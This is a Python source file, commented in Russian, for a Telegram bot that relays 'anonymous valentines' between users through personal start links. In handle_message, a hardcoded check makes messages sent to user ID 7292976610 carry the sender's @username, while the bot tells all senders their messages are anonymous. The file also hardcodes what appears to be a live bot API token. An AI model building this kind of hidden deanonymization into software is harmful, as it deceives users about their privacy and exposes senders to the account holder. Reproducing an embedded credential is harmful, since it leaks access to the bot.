import telebot  # Импортируем библиотеку python-telegram-bot для работы с API Telegram

TOKEN = "7351637070:AAHoIYtqhjmXVFuQXPr946h8Xxdo_ssZJi4"  # Замените на токен, полученный от @BotFather
bot = telebot.TeleBot(TOKEN)  # Создаём объект бота с вашим токеном

# Словарь для хранения активных пользователей, ожидающих ввод валентинки: {user_id: target_user_id}
waiting_valentine = {}


# Обработчик команды /start
@bot.message_handler(commands=['start'])
def handle_start(message):
    """
    Функция обрабатывает команду /start. Если после команды передан ID пользователя, 
    то начинает процесс отправки валентинки этому пользователю. 
    Иначе предлагает пользователю начать получать сообщения и выдает персональную ссылку.
    """
    user_id = message.chat.id
    args = message.text.split()[1:]  # Получаем аргументы после /start

    # Проверяем, есть ли аргумент (ID) после /start
    if args and args[0].isdigit():
        target_user_id = int(args[0])
        waiting_valentine[user_id] = target_user_id  # Запоминаем, кому отправить
        bot.send_message(user_id, "💌Введите текст вашей валентинки:\n", reply_markup=telebot.types.ReplyKeyboardRemove())
    else:
        # Если пользователь не в режиме ожидания валентинки, предлагаем начать получать сообщения
        keyboard = telebot.types.InlineKeyboardMarkup()
        keyboard.add(telebot.types.InlineKeyboardButton('Начать получать сообщения', callback_data='get_started'))
        bot.send_message(user_id, "🩷Приветик, в этом ботике ты можешь получать и отправлять Анонимные Валентинки💌\n\n"
                                    "Жми кнопочку ниже⤵️", reply_markup=keyboard)


# Обработчик inline-кнопок
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    """
    Функция обрабатывает нажатия на inline-кнопки.
    """
    user_id = call.message.chat.id

    if call.data == 'get_started':
        # Генерируем персональную ссылку для пользователя
        personal_link = f"https://t.me/{bot.get_me().username}?start={user_id}"
        bot.edit_message_text(chat_id=user_id, message_id=call.message.message_id,
                              text=f"💖Ваша ссылка для получения валентинок:\n{personal_link}")
    elif call.data == 'send_valentine':
        # Запоминаем, что пользователь хочет отправить валентинку
        waiting_valentine[user_id] = call.message.chat.id
        bot.send_message(user_id, "💌Введите текст вашей валентинки:\n", reply_markup=telebot.types.ReplyKeyboardRemove())
    elif call.data.startswith("reply_to_"):
        # Получаем ID пользователя, которому нужно отправить ответ
        target_user_id = int(call.data.split("_")[-1])

        # Просим пользователя ввести ответ
        bot.send_message(user_id, "Введите ваше послание:")

        # Запоминаем, что этот пользователь отвечает на сообщение от target_user_id
        waiting_valentine[user_id] = target_user_id


# Обработчик текстовых сообщений
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    """
    Функция обрабатывает все текстовые сообщения, отправленные боту. 
    Отправляет валентинку, если пользователь находится в режиме ожидания ввода.
    """
    user_id = message.chat.id
    sender_username = message.from_user.username  # Получаем username отправителя

    # Если пользователь находится в режиме ожидания ввода валентинки
    if user_id in waiting_valentine:
        # Получаем ID получателя валентинки
        target_user_id = waiting_valentine[user_id]

        # Формируем текст сообщения с или без имени пользователя
        if target_user_id == 7292976610:
            valentine_text = f"💌Получено новое анонимное сообщение от @{sender_username}:\n\n{message.text}"
        else:
            valentine_text = f"💌Получено новое анонимное сообщение:\n\n{message.text}"

        # Отправляем валентинку целевому пользователю
        keyboard = telebot.types.InlineKeyboardMarkup()
        keyboard.add(telebot.types.InlineKeyboardButton('Ответить', callback_data=f'reply_to_{user_id}'))
        bot.send_message(target_user_id, valentine_text, reply_markup=keyboard)

        # Удаляем пользователя из списка ожидающих
        del waiting_valentine[user_id]

        # Отправляем сообщение отправителю
        bot.send_message(user_id, "Сообщение отправлено!")

        # Предлагаем пользователю начать получать сообщения
        keyboard = telebot.types.InlineKeyboardMarkup()
        keyboard.add(telebot.types.InlineKeyboardButton('Начать получать сообщения', callback_data='get_started'))
        bot.send_message(user_id, "🩷Приветик, в этом ботике ты можешь получать и отправлять Анонимные Валентинки💌\n\n"
                                    "Жми кнопочку ниже⤵️", reply_markup=keyboard)
    else:
        # Обрабатываем остальные сообщения, например, если пользователь отправил текст без команды
        bot.send_message(user_id, "Воспользуйтесь командой /start, чтобы начать.")

# Запускаем бота
bot.polling(none_stop=True)
